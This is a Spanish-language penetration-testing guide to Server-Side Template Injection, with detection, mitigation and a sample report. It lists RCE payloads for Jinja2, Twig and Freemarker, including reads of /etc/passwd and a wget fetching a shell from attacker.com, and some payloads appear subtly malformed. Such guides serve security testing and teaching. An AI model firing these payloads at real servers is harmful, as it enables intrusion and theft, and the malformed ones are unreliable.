# Server-Side Template Injection (SSTI)

## Resumen

SSTI es una vulnerabilidad que permite a un atacante inyectar código en plantillas procesadas por el servidor, ejecutándolo con los privilegios de la aplicación. A través de SSTI se puede obtener RCE, acceder a variables de entorno, leer archivos sensibles y comprometer la infraestructura completa.

## Contexto

Las aplicaciones web que usan motores de plantillas (Jinja2, Twig, Velocity, ERB, Freemarker, Razor, Mustache, etc.) construyen vistas combinando HTML con datos del servidor. Si no se filtra correctamente el input que llega a las plantillas, un atacante puede insertar expresiones en el template que el motor evalúa en el servidor antes de renderizar la respuesta.

Entornos comunes:

- **Python:** Jinja2, Django Templates
- **Java:** Freemarker, Velocity, Thymeleaf
- **PHP:** Twig, Smarty
- **Ruby:** ERB
- **.NET:** Razor

## Metodología de Ataque

### 1. Identificación de Puntos de Inyección

- Parámetros visibles en plantillas: `{{ user_input }}`, `{% include user_input %}`
- Campos de entrada en formularios, cabeceras, cookies, variables de URL
- Mensajes de error que reflejan directamente templates

### 2. Pruebas Manuales Básicas

1. **Prueba de delimitadores**:
   - `{{7*7}}` → debe renderizar `49`
   - `{% if 7>3%}true{% endif %}` → `true`
2. **Confirmación de motor**:
   - Jinja2: `{{ config.items() }}`
   - Freemarker: `${"freemarker".getClass().forName("java.lang.Runtime")}`
3. **Proof of Concept RCE**:
   - Jinja2: `{{ ''.__class__.__mro__.__subclasses__()('id',shell=True,stdout=-1).stdout.read() }}`
   - Twig: `{{ _self.registerUndefinedFilterCallback('system') }}{{ 'id'|system }}`

### 3. Explotación Avanzada

- **Lectura de archivos**:
  - Jinja2: `{{ ''.__class__.__mro__.__subclasses__()('cat /etc/passwd',shell=True,stdout=-1).stdout.read() }}`
- **Carga dinámica de módulos**:
  - Freemarker: `${Runtime.getRuntime().exec("wget attacker.com/shell -O /tmp/shell")}`
- **Pivoting interno**: invocar endpoints internos, metadatos de nube o bases de datos ocultas.

## Pruebas Manuales

```http
GET /hello?name={{7*7}} HTTP/1.1
Host: victim.com
```

- Si la respuesta incluye `49`, hay inyección.

```http
GET /hello?name={{config.items()}} HTTP/1.1
```

- Revela configuración interna.

## PoC

1. Identificar template vulnerable: `/?page=home`
2. Inyectar expresión: `/?page={{7*7}}`
3. Observar `49` en la respuesta
4. Ejecutar comando:

```
/?page={{ ''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).stdout.read() }}
```

## Automatización

- **tplmap**:

```bash
tplmap -u "https://victim.com/?page=home" --data "page=FUZZ" --batch
```

- **Burp Suite Extension: SSTI Hunter** para escaneo de payloads específicos de cada motor.

## Explotación / Impacto

- **RCE completo** con privilegios de aplicación.
- **Lectura de archivos sensibles**: `/etc/passwd`, `config.php`, claves SSH.
- **Despliegue de shells** y malware persistente.
- **Exfiltración de credenciales y secretos** de nube.

## Detección

- Monitorizar plantillas con evaluación de expresiones dinámicas.
- Revisar logs de errores que incluyan traces de motor de plantillas.
- Analizar respuestas que contengan caracteres de delimitadores (`{{`, `}}`, `{%`, `%}`).

## Mitigación

1. **Whitelist de funciones** y deshabilitar ejecución de código en plantillas.
2. **Escapado estricto** de cualquier input inyectado en templates.
3. **Uso de motores seguros** que no permitan ejecución de expresiones arbitrarias (Mustache sin lógica).
4. **Validación de input** por whitelist de patrones.
5. **Principio de menor privilegio**: plantillas sin acceso a APIs de sistema o runtime.

## Reporte

**Título:** Server-Side Template Injection – Ejecución Arbitraria de Código
**Resumen Ejecutivo:** El parámetro `page` se inyecta sin filtrar en el template, permitiendo ejecutar código en el servidor y comprometer la infraestructura.
**Pasos de Reproducción:**

1. `GET /?page={{7*7}}` → respuesta `49`.
2. Inyección RCE con llamada a `id`.
   **Mitigación Recomendada:** Escapar y validar input, deshabilitar expresiones peligrosas en motor de plantillas, usar motor sin lógica.
